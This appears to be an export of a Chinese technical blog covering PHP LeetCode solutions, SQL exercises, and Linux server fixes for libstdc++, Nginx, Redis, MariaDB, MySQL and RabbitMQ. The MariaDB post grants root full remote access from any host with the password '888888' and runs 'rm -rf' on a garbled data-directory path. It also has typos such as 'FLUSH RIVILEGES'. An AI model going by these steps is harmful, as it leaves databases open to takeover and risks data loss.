&lt;1.5.0.0-dev 例子：1.0 - 2.0 如果你想指定版本只要稳定版本，你可以在版本后面添加后缀 -stable。minimum-stability 配置项定义了包在选择版本时对稳定性的选择的默认行为。默认是stable。它的值如下（按照稳定性排序）：dev，alpha，beta，RC和stable。除了修改这个配置去修改这个默认行为，我们还可以通过稳定性标识（例如@stable和@dev）来安装一个相比于默认配置不同稳定性的版本。例如： 123456&#123; "require": &#123; "monolog/monolog": "1.0.*@beta", "acme/foo": "@dev" &#125;&#125;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[LeetCode练习]]></title>
    <url>%2Farticles%2FLeetCode%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[本文记录LeetCode练习。 算法两数之和1234567891011121314151617181920class Solution &#123; /** * @param Integer[] $nums * @param Integer $target * @return Integer[] */ function twoSum($nums, $target) &#123; if(is_array($nums))&#123; foreach($nums as $k1=&gt;$v)&#123; $offset = $target-$v; $k2 = array_search($offset,$nums); if(false !== $k2 &amp;&amp; $k1!=$k2)&#123; return [$k1,$k2]; &#125; &#125; &#125; return []; &#125;&#125; 两数相加1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/** * Definition for a singly-linked list. * class ListNode &#123; * public $val = 0; * public $next = null; * function __construct($val) &#123; $this-&gt;val = $val; &#125; * &#125; */class Solution &#123; /** * @param ListNode $l1 * @param ListNode $l2 * @return ListNode */ function addTwoNumbers($l1, $l2) &#123; $node = new ListNode(0); $out = 0;// 上一次进位 $header = $node;// 头结点 while($l1 || $l2)&#123; $x = $l1-&gt;val ?? 0; $y = $l2-&gt;val ?? 0; $sum = $x + $y + $out; $val = intval($sum % 10); // 下一次进位 $out = intval($sum / 10); // 构建下一个结点 $node-&gt;next = new ListNode($val); // 指针移到下一个结点 $node = $node-&gt;next; $l1 = $l1-&gt;next ?? null; $l2 = $l2-&gt;next ?? null; &#125; // 最后一个计算溢位 if($out &gt; 0)&#123; $node-&gt;next = new ListNode($out); &#125; return $header-&gt;next; &#125;&#125; 最大数12345678910111213141516171819202122232425class Solution &#123; /** * @param Integer[] $nums * @return String */ function largestNumber($nums) &#123; if (!is_array($nums)) return ''; $len = count($nums); for ($i = 0; $i &lt; $len; $i++) &#123; for ($j = $i + 1; $j &lt; $len; $j++) &#123; if ( $nums[$i] . $nums[$j] &lt; $nums[$j] . $nums[$i] ) &#123; $_tmp = $nums[$i]; $nums[$i] = $nums[$j]; $nums[$j] = $_tmp; &#125; &#125; &#125; $ret = implode($nums); return empty($ret[0]) ? '0' : $ret; &#125;&#125; 无重复字符的最长子串12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution &#123; /** * @param String $s * @return Integer */ function lengthOfLongestSubstring($s) &#123; $len = strlen($s); $p = 0; $_tmp = ""; $max = 0; while($p &lt; $len)&#123; $target = $s[$p]; $pos = strpos($_tmp,$target); if (false !== $pos) &#123; $c = strlen($_tmp); $t = $pos; $_tmp = substr($_tmp, $t-$c+1,$c-$t-1); &#125; $_tmp .= $target; $c = strlen($_tmp); if( $c &gt; $max ) &#123; $max = $c; &#125; $p++; &#125; return $max; &#125;&#125; 寻找两个有序数组的中位数1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123; /** * @param Integer[] $nums1 * @param Integer[] $nums2 * @return Float */ function findMedianSortedArrays($nums1, $nums2) &#123; // define recursive function $recursive = function (array $nums1, int $i, array $nums2, int $j, int $k) use (&amp;$recursive) &#123; if (!isset($nums1[$i])) return $nums2[$j + $k - 1];//nums1为空数组 if (!isset($nums2[$j])) return $nums1[$i + $k - 1];//nums2为空数组 if ($k == 1)// 最后一次递归 return min($nums1[$i], $nums2[$j]); $k2 = intval($k / 2); $midVal1 = $nums1[$i + $k2 - 1] ?? PHP_INT_MAX; $midVal2 = $nums2[$j + $k2 - 1] ?? PHP_INT_MAX; if ($midVal1 &lt; $midVal2) &#123; return $recursive($nums1, $i + $k2, $nums2, $j, $k - $k2); &#125; else &#123; return $recursive($nums1, $i, $nums2, $j + $k2, $k - $k2); &#125; &#125;; // calc $len = count($nums1) + count($nums2); $left = $recursive($nums1, 0, $nums2, 0, intval($len + 1) / 2); $right = $recursive($nums1, 0, $nums2, 0, intval($len + 2) / 2); return ($left + $right) / 2.0; &#125; &#125; 最长回文子串12345678910111213141516171819202122232425262728293031class Solution &#123; /** * @param String $s * @return String */ function longestPalindrome($str) &#123; $len = strlen($str); $hlen = 1; $start = 0; for ($i = 0; $i &lt; $len; $i++) &#123; $l = $h = $i; // 下面两个while只可能有一个执行 while ($h &lt; $len - 1 &amp;&amp; $str[$l] == $str[$h + 1]) &#123;// 非中心对称 $h++; &#125; while ( $l &gt; 0 &amp;&amp; $h &lt; $len - 1 // 边界 &amp;&amp; $str[$l - 1] == $str[$h + 1]// 中心对称 ) &#123; $l--; $h++; &#125; $max = $h - $l + 1; if ($hlen &lt; $max) &#123; $hlen = $max; $start = $l; &#125; &#125; return substr($str, $start, $hlen); &#125;&#125; Z 字形变换思路分析： 以 row = 5 为例， 123451 9 17 25 332 8 10 16 18 24 26 32 343 7 11 15 19 23 27 31 354 6 12 14 20 22 28 30 365 13 21 29 37 取出竖列 k(第K行)\i(第i列) 1 2 3 4 5 1 1 9 17 25 33 2 2 10 18 26 34 3 3 11 19 27 35 4 4 12 20 28 36 5 5 13 21 29 37 可以得到竖列取值的规律: 当 row != 1 时, m = k+2(i-1)(n-1), 当 row = 1 时, m = i. 其中 k ： 层级， i ： 列数，n ： 行数, m：对应竖列上的值 分析每个数列中间值关系 i k ans 2 1 m+8 2 2 m+6 2 3 m+4 2 4 m+2 2 5 m+0 * * * i’ n m+2(n-k) 中间值ans看着像和i是无关的，事实上是有关的，别忘了m的取值 得出结论，中间值的规律： ans = m+2(n-k) 算法实现如下 : 12345678910111213141516171819202122232425262728293031class Solution&#123; function convert($str, $n) &#123; $k = 1; $tmp = ''; if ($n == 1) &#123; $tmp = $str; &#125; else &#123; $strlen = strlen($str); while ($k &lt;= $n) &#123; $i = 1; $f = $n - $k; while ($i &lt;= $strlen) &#123; $m = $k + 2 * ($i - 1) * ($n - 1); $ans = $m + 2 * $f; if (empty($str[$m - 1])) break; $tmp .= $str[$m - 1]; if ($f &gt; 0 &amp;&amp; $f &lt; $n - 1 &amp;&amp; !empty($str[$ans - 1])) &#123; $tmp .= $str[$ans - 1]; &#125; $i++; &#125; $k++; &#125; &#125; return $tmp; &#125;&#125; 整数反转法一: 栈思想 1234567891011121314151617181920212223242526272829class Solution &#123; /** * @param Integer $x * @return Integer */ function reverse($x) &#123; $rev = 0; $max = (1 &lt;&lt; 31) - 1;// 最大值 $min = -1 &lt;&lt; 31;// 最小值 if ($x &gt; $max || $x &lt; $min) return 0;// 参数是否超出 while ($x != 0) &#123; $pop = $x % 10; // 取最后一位数 $x = intval($x / 10);// 降位 // 越界判断 if ($rev &gt; $max / 10 || ($rev == $max / 10 &amp;&amp; $pop &gt; $max % 10)) return 0; // 正数 if ($rev &lt; $min / 10 || ($rev == $min / 10 &amp;&amp; $pop &lt; $min % 10)) return 0; // 负数 // 逆序升位 $rev = $rev * 10 + $pop; &#125; return $rev; &#125; &#125; 法二: 字符串反转 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364class Solution &#123; /** * @param Integer $x * @return Integer */ function reverse($x) &#123; $max = (1 &lt;&lt; 31) - 1;// 最大值 $min = -1 &lt;&lt; 31;// 最小值 if ($x &gt; $max || $x &lt; $min) return 0;// 参数是否超出 $is_negative = $x &lt; 0 ? true : false; // 正负判断 $x = $is_negative ? -$x : $x; // 转成整数 $x = '' . $x; // 转换成字符串 $rev_str = $is_negative? '-' : '' ; // 保留符号 for ($len = strlen($x), $i = $len - 1; $i &gt;= 0; $i--) &#123; // 逆转字符 $rev_str .= $x[$i]; &#125; // 判断是否越界输出 return -1 == $this-&gt;int_str_compare($rev_str, $is_negative ? $min : $max) ? intval($rev_str) : 0; &#125; // // 数字字符串大小比较( 虽然 -1 &gt; -2,但是此处不考虑负数，所以 -1 &lt; -2) // // -1 表示 str1 &lt; str2 // 0 表示 str1 = str2 // 1 表示 str1 &gt; str2 // function int_str_compare($str1, $str2) &#123; $len1 = strlen($str1 = '' . $str1); $len2 = strlen($str2 = '' . $str2); // 长度对齐 if ($len1 &gt; $len2) &#123; $str2 = str_pad($str2, $len1, '0', STR_PAD_LEFT); &#125; else &#123; $str1 = str_pad($str1, $len2, '0', STR_PAD_LEFT); &#125; $compare = 0;// 大小比较 for ($i = 0, $len = strlen($str1); $i &lt; $len; $i++) &#123; $f = intval($str1[$i]) - intval($str2[$i]); // 数字的每一位长度肯定不会超出0-9的范围，所以肯定不会超出 if ($f &gt; 0) &#123; $compare = 1; break;// 有一个比它大就全部比它大 &#125; elseif ($f &lt; 0) &#123; $compare = -1; break;// 有一个比它小就全部比它小 &#125; else &#123; $compare = 0;// 相等的话就继续比较下一位，直到最后以为相等才能说明str1等于str2 &#125; &#125; return $compare; &#125; &#125; SQL架构第二高的薪水1select (select distinct(Salary) from Employee order by Salary DESC limit 1 offset 1) as SecondHighestSalary 第N高的薪水1234567CREATE FUNCTION getNthHighestSalary(N INT) RETURNS INTBEGIN SET N=N-1; RETURN ( select (select distinct(Salary) from Employee order by Salary DESC limit 1 offset N) as getNthHighestSalary );END 分数排名1SELECT a.Score,(select count(distinct(b.Score)) from Scores as b where b.Score&gt;a.Score)+1 as Rank FROM Scores as a ORDER BY Score DESC 连续出现的数字12345678910select distinct Num as ConsecutiveNumsfrom ( select Num, case when @prev = Num then @count := @count + 1 when (@prev := Num) is not null then @count := 1 end as CNT from Logs, (select @prev := null,@count := null) as t) as tempwhere temp.CNT &gt;= 3 不懂自定义变量的同学可以参考mysql中的用户变量]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决类似 /usr/lib64/libstdc++.so.6:version `GLIBCXX_3.4.21' not found 的问题]]></title>
    <url>%2Farticles%2F%E8%A7%A3%E5%86%B3%E7%B1%BB%E4%BC%BC%20-usr-lib64-libstdc-so-6-%20version%20-GLIBCXX-3-4-21-%20not%20found%20%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[源码编译升级安装了gcc后，编译程序或运行其它程序时，有时会出现类似/usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.21’ not found的问题。这是因为升级gcc时，生成的动态库没有替换老版本gcc的动态库导致的，将gcc最新版本的动态库替换系统中老版本的动态库即可解决。 问题原因分析 为了安装最新版本的Node.js（最新版本的Node.js使用了C++ 11中，而C++ 11需要code&gt;gcc 4.8+才能支持），将gcc升级到了当前最新版本v 5.2.0。升级后，成功编译安装了新版本的Node.js（v 4.2.1）,但运行时程序时出现了以下错误： 12345node: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.21&apos; not found (required by node)node: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.15&apos; not found (required by node)node: /usr/lib64/libstdc++.so.6: version `GLIBCXX_3.4.20&apos; not found (required by node) 运行以下命令检查动态库： 1strings /usr/lib64/libstdc++.so.6 | grep GLIBC 输出结果如下： 12345678910111213141516171819202122232425262728293031GLIBCXX_3.4GLIBCXX_3.4.1GLIBCXX_3.4.2GLIBCXX_3.4.3GLIBCXX_3.4.4GLIBCXX_3.4.5GLIBCXX_3.4.6GLIBCXX_3.4.7GLIBCXX_3.4.8GLIBCXX_3.4.9GLIBCXX_3.4.10GLIBCXX_3.4.11GLIBCXX_3.4.12GLIBCXX_3.4.13GLIBCXX_FORCE_NEWGLIBCXX_DEBUG_MESSAGE_LENGTH 从以上输出可以看出，gcc的动态库还是旧版本的。说明出现这些问题，是因为升级gcc时，生成的动态库没有替换老版本gcc的动态库。 问题处理 执行以下命令，查找编译gcc时生成的最新动态库： 1find / -name "libstdc++.so*" 输出如下： 1234567/home/gcc-5.2.0/gcc-temp/stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so/home/gcc-5.2.0/gcc-temp/stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6/home/gcc-5.2.0/gcc-temp/stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21 // 最新动态库/home/gcc-5.2.0/gcc-temp是升级gcc时的输出目录。 将上面的最新动态库libstdc++.so.6.0.21复制到/usr/lib64目录下： 1cp path/libstdc++.so.6.0.21 /usr/lib64 复制后，修改系统默认动态库的指向，即：重建默认库的软连接。 切换工作目录至/usr/lib64： 1cd /usr/lib64 删除原来软连接： 1rm -rf libstdc++.so.6 将默认库的软连接指向最新动态库： 1ln -s libstdc++.so.6.0.21 libstdc++.so.6 默认动态库升级完成。重新运行以下命令检查动态库： 1strings /usr/lib64/libstdc++.so.6 | grep GLIBC 现在输出如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051GLIBCXX_3.4GLIBCXX_3.4.1GLIBCXX_3.4.2GLIBCXX_3.4.3GLIBCXX_3.4.4GLIBCXX_3.4.5GLIBCXX_3.4.6GLIBCXX_3.4.7GLIBCXX_3.4.8GLIBCXX_3.4.9GLIBCXX_3.4.10GLIBCXX_3.4.11GLIBCXX_3.4.12GLIBCXX_3.4.13GLIBCXX_3.4.14GLIBCXX_3.4.15GLIBCXX_3.4.16GLIBCXX_3.4.17GLIBCXX_3.4.18GLIBCXX_3.4.19GLIBCXX_3.4.20GLIBCXX_3.4.21GLIBC_2.3GLIBC_2.2.5GLIBC_2.3.2GLIBCXX_FORCE_NEWGLIBCXX_DEBUG_MESSAGE_LENGTH]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[如何创建泛域名]]></title>
    <url>%2Farticles%2F%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E6%B3%9B%E5%9F%9F%E5%90%8D%2F</url>
    <content type="text"><![CDATA[在域名管理处做一个泛解析 .domain.com 指向服务器的ip, 然后在Nginx配置文件里面增加配置,这个配置还可以制作多级域名,例如.demo.domain.com. 例子: web主目录下创建一个test的文件夹自动生成一个叫test.domain.com 的网址. WEB_ROOT : /data/www HOST: domain.com *NGINX配置代码: 12345678910111213141516171819202122232425262728293031323334server &#123; listen 80; server_name ~^(?&lt;subdomain&gt;.+)\.domain\.com$; root /web/data/www/$subdomain; index index.php index.html index.htm; location / &#123; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; if (!-e $request_filename) &#123; rewrite ^(.*)$ /index.php?s=$1/ last; break; &#125; &#125; location ~ .*\.php(\/.*)*$ &#123; fastcgi_pass unix:/tmp/php-cgi.sock; fastcgi_index index.php; include fastcgi.conf; &#125;&#125;]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Centos7 Redis自启动报错]]></title>
    <url>%2Farticles%2FCentos7%20%20Redis%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%A5%E9%94%99%2F</url>
    <content type="text"><![CDATA[错误日志如下 systemctl status redis.service 1234567891011121314151617181920212223242526272829● redis.service - Redis persistent key-value databaseLoaded: loaded (/usr/lib/systemd/system/redis.service; enabled; vendor preset: disabled)Drop-In: /etc/systemd/system/redis.service.d└─limit.confActive: failed (Result: exit-code) since Mon 2019-03-11 16:59:42 CST; 10s agoProcess: 5711 ExecStop=/usr/libexec/redis-shutdown (code=exited, status=1/FAILURE)Process: 5709 ExecStart=/usr/bin/redis-server /etc/redis.conf --supervised systemd (code=exited, status=1/FAILURE)Main PID: 5709 (code=exited, status=1/FAILURE)Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: Starting Redis persistent key-value database...Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: redis.service: main process exited, code=exited, status=1/FAILUREMar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ redis-shutdown[5711]: Could not connect to Redis at 127.0.0.1:6379: Connection refusedMar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: redis.service: control process exited, code=exited status=1Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: Failed to start Redis persistent key-value database.Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: Unit redis.service entered failed state.Mar 11 16:59:42 iZj6c6ncdtlrfnzsy28pyiZ systemd[1]: redis.service failed. 查错 cat /lib/systemd/system/redis.service 12345678910111213141516171819202122232425262728//显示[Unit]Description=Redis persistent key-value databaseAfter=network.target[Service]ExecStart=/usr/bin/redis-server /etc/redis.conf --supervised systemdExecStop=/usr/libexec/redis-shutdownType=notifyUser=redisGroup=redisRuntimeDirectory=redisRuntimeDirectoryMode=0755[Install]WantedBy=multi-user.target 说明这个服务系统启动后是redis组的，所以改文件权限为redis组即可 解决方案 chown redis:redis /var/log/redis/redis.log]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[centos7 MariaDB 升级到最新版本]]></title>
    <url>%2Farticles%2Fcentos7%20MariaDB%20%E5%8D%87%E7%BA%A7%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[1.创建/etc/yum.repos.d/MariaDB.repo文件， 下面以 10.0 版为例 123456789[mariadb]name = MariaDBbaseurl = http://yum.mariadb.org/10.0/centos6-amd64/gpgkey = https://yum.mariadb.org/RPM-GPG-KEY-MariaDBgpgcheck = 1 2.关闭并卸载旧版本的mariadb，安装新版本的mariadb。 1234567systemctl stop mariadbyum remove mariadb-server mariadb mariadb-libsyum clean allyum install MariaDB-server MariaDB-client 3.自定义数据目录和服务端口，移除默认的数据目录，创建新的数据目录。 123rm -rf /var/lib[mysqlmkdir /var/data/db/mariadb 4.修改配置文件/etc/my.cnf.d/mysql-clients.cnf，重点是[client]，其他的可以参考 1234567891011121314151617181920212223242526272829[client]port = 3307socket = /var/data/db/mariadb/mysql.sock[mysql]no-auto-rehash[mysqldump]quickmax_allowed_packet = 64M[myisamchk]key_buffer_size = 128Msort_buffer_size = 128Mread_buffer = 2Mwrite_buffer = 2M[mysqlhotcopy]interactive-timeout 5.修改配置文件/etc/my.cnf.d/server.cnf，这里的性能参数来自my-large.ini文件 1234567891011121314151617181920212223242526272829303132333435[mysqld]port = 3307datadir = /var/data/db/mariadbsocket = /var/data/db/mariadb/mysql.sockskip-external-lockingkey_buffer_size = 256Mmax_allowed_packet = 64Mtable_open_cache = 256sort_buffer_size = 1Mread_buffer_size = 1Mread_rnd_buffer_size = 4Mmyisam_sort_buffer_size = 64Mthread_cache_size = 8query_cache_size= 16Mthread_concurrency = 8log-bin=mysql-binbinlog_format=mixedserver-id = 1 6.初始化数据 1mysql_install_db --defaults-file=/etc/my.cnf --datadir=/var/data/db/mariadb/ --user=mysql 7.启动服务 1systemctl restart mysql 8.设置ROOT密码 1mysqladmin -u root password &quot;8888888&quot; 9.登陆mysql 1mysql -uroot -p 10.授权root远程登录 root可从任何IP登陆，注意修改密码:’888888’ 123mysql&gt;GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;888888&apos; WITH GRANT OPTION;mysql&gt;FLUSH RIVILEGES; root可从指定IP登陆，注意修改密码:’888888’、IP:’192.168.1.188’ 123mysql&gt;GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;192.168.1.188&apos; IDENTIFIED BY &apos;888888&apos; WITH GRANT OPTION;mysql&gt;FLUSH RIVILEGES;]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CentOS下MySQL忘记root密码解决方法]]></title>
    <url>%2Farticles%2FCentOS%E4%B8%8BMySQL%E5%BF%98%E8%AE%B0root%E5%AF%86%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1．首先确认服务器出于安全的状态，也就是没有人能够任意地连接MySQL数据库。 因为在重新设置MySQL的root密码的期间，MySQL数据库完全出于没有密码保护的 状态下，其他的用户也可以任意地登录和修改MySQL的信息。可以采用将MySQL对 外的端口封闭，并且停止Apache以及所有的用户进程的方法实现服务器的准安全 状态。最安全的状态是到服务器的Console上面操作，并且拔掉网线。 2．修改MySQL的登录设置： 1# vim /etc/my.cnf 在[mysqld]的段中加上一句：skip-grant-tables 例如： 1234567[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockskip-grant-tables 保存并且退出vi。 3．重新启动mysqld 12345# service mysqld restartStopping MySQL: [ OK ]Starting MySQL: [ OK ] 4．登录并修改MySQL的root密码 1234567891011121314151617181920212223# mysqlWelcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 3 to server version: 3.23.56Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the buffer.mysql&gt; USE mysql ;Database changedmysql&gt; UPDATE user SET Password = password ( &apos;new-password&apos; ) WHERE User = &apos;root&apos; ;Query OK, 0 rows affected (0.00 sec)Rows matched: 2 Changed: 0 Warnings: 0mysql&gt; flush privileges ;Query OK, 0 rows affected (0.01 sec)mysql&gt; quit 5．将MySQL的登录设置修改回来 1# vim /etc/my.cnf 将刚才在[mysqld]的段中加上的skip-grant-tables删除 保存并且退出vim 6．重新启动mysqld 12345# service mysqld restartStopping MySQL: [ OK ]Starting MySQL: [ OK ]]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RabbitMQ快速上手教程]]></title>
    <url>%2Farticles%2FRabbitMQ%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[WINDOWS系统1、安装Erlang语言开发包 下载地址：传送门 配置环境变量 ERLANG_HOME C:\Program Files (x86)\erl5.9 (即erl安装位置) 添加到PATH %ERLANG_HOME%\bin; 2、安装RabbitMQ提示：中文路径名将会安装失败 下载安装RabbitMQ，下载地址：传送门 配置环境变量 RABBITMQ_SERVER C:\Program Files (x86)\RabbitMQ Server\rabbitmq_server-2.8.0 (即rabbitmq_server安装位置) 添加到PATH %RABBITMQ_SERVER%\sbin; 然后到dos(命令提示符)里面切换到RabbitMQ目录下，执行 rabbitmq-plugins.bat enable rabbitmq_management， 执行完成之后以管理员身份启动 rabbitmq：依次输入命令： 12345rabbitmq-service.bat stoprabbitmq-service.bat installrabbitmq-service.bat start 然后，浏览器中输入:127.0.0.1:15672,用户名密码是guest ,如果能登陆就说明安装成功 到此 RabbitMQ 已经安装完成，接下来针对php安装扩展（非php技术栈可跳过） 3、安装php的amqp扩展 根据phpinfo()的信息去下载相应的amqp扩展DLL版本： 传送门 将压缩包中php_amqp.dll复制到php/ext目录下 然后在php.ini中添加如下代码： 123[amqp]extension=php_amqp.dll 再将压缩包中rabbitmq.1.dll复制到php根目录C:/wampserver/php/(目录和下面配置目录保持一致即可) 然后修改apache配置文件httpd.conf，添加如下代码： 123# rabbitmqLoadFile &quot;C:/wampserver/php/rabbitmq.1.dll&quot; 最后重启服务器. phpinfo() 出现下图说明安装成功： Linux系统1、安装rabbitmq123a) 进入rabbitmq文件的存放目录b) rpm -ivh rabbitmq-server-3.5.4-1.noarch.rpm 2、修改配置123cd /etc/rabbitmqcd /usr/share/doc/rabbitmq-server-3.5.4 拷贝 1cp rabbitmq.config.example /etc/rabbitmq/rabbitmq.config 进入到拷贝的rabbitmq.config目录 修改配置 1vim rabbitmq.config 修改 {loopback_users, []} 把注释和后面的逗号去掉； 3、启动服务(在etc/rabbitmq目录下执行)1service rabbitmq-server start 4、设置开机启动1chkconfig rabbitmq-server on 5、开启控制台管理插件1rabbitmq-plugins enable rabbitmq_management 6、网页打开1http://localhost:15672 默认用户名密码：guest/guest 7、打开端口(程序访问端口5672)123/sbin/iptables -I INPUT -p tcp --dport 15672 -j ACCEPT/sbin/iptables -I INPUT -p tcp --dport 5672 -j ACCEPT 保存 1/etc/rc.d/init.d/iptables save 查看端口打开 1/etc/init.d/iptables status 测试DEMO安装amqplib扩展 compose.json 12345&#123; "require": &#123; "php-amqplib/php-amqplib": "&gt;=2.6.1" &#125;&#125; send.php 生产端 1234567891011121314151617181920212223&lt;?phprequire_once __DIR__ . '/vendor/autoload.php';use PhpAmqpLib\Connection\AMQPStreamConnection;use PhpAmqpLib\Message\AMQPMessage;$connection = new AMQPStreamConnection('locahost', 5672, 'root', 'root'); // 注意此处有账号权限限制$channel = $connection-&gt;channel();$channel-&gt;queue_declare('hello', false, false, false, false);$msg = new AMQPMessage('Hello World!');$channel-&gt;basic_publish($msg, '', 'hello');echo " [x] Sent 'Hello World!'\n";$channel-&gt;close();$connection-&gt;close(); receive.php 消费端 12345678910111213141516171819202122232425262728293031&lt;?phprequire_once __DIR__ . '/vendor/autoload.php';use PhpAmqpLib\Connection\AMQPStreamConnection;$connection = new AMQPStreamConnection('localhost', 5672, 'root', 'root');$channel = $connection-&gt;channel();$channel-&gt;queue_declare('hello', false, false, false, false);echo " [*] Waiting for messages. To exit press CTRL+C\n";$callback = function ($msg) &#123; echo ' [x] Received ', $msg-&gt;body, "\n";&#125;;$channel-&gt;basic_consume('hello', '', false, true, false, false, $callback);while (count($channel-&gt;callbacks)) &#123; $channel-&gt;wait();&#125;$channel-&gt;close();$connection-&gt;close();]]></content>
      <categories>
        <category>中间件</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[pack函数分析]]></title>
    <url>%2Farticles%2Fpack%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本文介绍的是通过二进制数据包的方式通信，演示语言为PHP和Golang。PHP提供了pack/unpack函数来进行二进制打包和二进制解包。在具体讲解之前，我们先来了解一些基础知识。 什么是字节序在不同的计算机体系结构中，对于数据(比特、字节、字)等的存储和传输机制有所不同，因而引发了计算机领域中一个潜在但是又很重要的问题，即通信双方交流的信息单元应该以什么样的顺序进行传送。如果达不成一致的规则，计算机的通信与存储将会无法进行。目前在各种体系的计算机中通常采用的字节存储机制主要有两种：大端(Big-endian)和小端(Little-endian)。这里所说的大端和小端即是字节序。 MSB和LSB MSB是Most Significant Bit/Byte的首字母缩写，通常译为最重要的位或最重要的字节。它通常用来表示在一个bit序列(如一个byte是8个bit组成的一个序列)或一个byte序列(如word是两个byte组成的一个序列)中对整个序列取值影响最大的那个bit/byte。 LSB是Least Significant Bit/Byte的首字母缩写，通常译为最不重要的位或最不重要的字节。它通常用来表明在一个bit序列(如一个byte是8个bit组成的一个序列)或一个byte序列(如word是两个byte组成的一个序列)中对整个序列取值影响最小的那个bit/byte。 对于一个十六进制int类型整数0x12345678来说，0x12就是MSB，0x78就是LSB。而对于0x78这个字节而言，它的二进制是01111000，那么最左边的那个0就是MSB，最右边的那个0就是LSB。 大端序 大端序又叫网络字节序。大端序规定高位字节在存储时放在低地址上，在传输时高位字节放在流的开始；低位字节在存储时放在高地址上，在传输时低位字节放在流的末尾。 小端序 小端序规定高位字节在存储时放在高地址上，在传输时高位字节放在流的末尾；低位字节在存储时放在低地址上，在传输时低位字节放在流的开始。 网络字节序 网络字节序是指大端序。TCP/IP都是采用网络字节序的方式，java也是使用大端序方式存储。 主机字节序 主机字节序代表本机的字节序。一般是小端序，但也有一些是大端序。 主机字节序用在协议描述中则是指小端序。 总结 字节序只针对于多字节类型的数据。比如对于int类型整数0x12345678，它占有4个字节的存储空间，存储方式有大端(0x12, 0x34, 0x56, 0x78)和小端(0x78, 0x56, 0x34, 0x12)两种。可以看到，在大端或小端的存储方式中，是以字节为单位的。所以对于单字节类型的数据，不存在字节序这个说法。 pack/unpack详解PHP pack函数用于将其它进制的数字压缩到位字符串之中。也就是把其它进制数字转化为ASCII码字符串。 格式字符翻译 代码 描述 a 将字符串空白以 NULL 字符填满 A 将字符串空白以 SPACE 字符 (空格) 填满 h 16进制字符串，低位在前以半字节为单位 H 16进制字符串，高位在前以半字节为单位 c 有符号字符 C 无符号字符 s 有符号短整数 (16位，主机字节序) S 无符号短整数 (16位，主机字节序) n 无符号短整数 (16位, 大端字节序) v 无符号短整数 (16位, 小端字节序) i 有符号整数 (依赖机器大小及字节序) I 无符号整数 (依赖机器大小及字节序) l 有符号长整数 (32位，主机字节序) L 无符号长整数 (32位，主机字节序) N 无符号长整数 (32位, 大端字节序) V 无符号长整数 (32位, 小端字节序) f 单精度浮点数 (依计算机的范围) d 双精度浮点数 (依计算机的范围) x 空字节 X 倒回一位 @ 填入 NULL 字符到绝对位置 格式字符详解 pack/unpack允许使用修饰符-和数字，紧跟在格式字符之后，用于指定该格式的个数； a和A都是用来打包字符串的，它们的唯一区别就是当小于定长时的填充方式。a以NULL填充，NULL事实上是’\0’的表示，代表空字节，8个位上全是0。A以空格填充，空格也即ASCII码为32的字符。这里有一个关于填充的使用场景的例子：请求登录的数据包规定用户名不超过20个字节，密码经过md5加密后是固定的32个字节。用户名就是变长的，为了便于服务器端读取和处理，通常会填充成定长。当然，这只是使用的方式之一，事实上还可以用变长的方式传递数据包，但这不在本文的探讨范围内。字符串有一点麻烦的是编码问题，尤其是在跟不同的平台通信时更为突出。比如在用pack进行打包字符串时，事实上是将字符内部的编码打包进去。单字节字符就没有问题，因为单字节在所有平台上都是一致的。 来看个例子(pack.php)： 12345&lt;?php$bin = pack("a", "d");echo "output: " . $bin . "\n";echo "output: 0x" . bin2hex($bin) . "\n"; 12$ php -f pack.phpoutput: doutput: 0x64 